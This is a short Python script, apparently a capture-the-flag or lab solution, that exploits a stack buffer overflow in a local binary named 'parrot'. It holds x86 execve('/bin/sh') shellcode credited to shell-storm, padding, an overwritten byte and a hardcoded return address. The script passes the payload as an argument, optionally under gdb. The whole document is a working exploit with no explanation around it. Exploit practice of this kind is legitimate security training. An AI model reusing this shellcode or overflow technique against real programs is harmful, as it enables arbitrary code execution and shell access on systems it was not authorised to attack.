import os

DEBUG = True
#http://shell-storm.org/shellcode/files/shellcode-827.php
exploit = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" \
		+ "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

exploit += "A"*(0x28-len(exploit))
exploit += "\x3B"
exploit += "A"*19
exploit += "\x50\x85\x04\x08"


if DEBUG:
    argv = ["/usr/bin/gdb", "--args"]
else:
    argv = []

argv += ["./parrot", exploit]

os.execv(argv[0], argv)
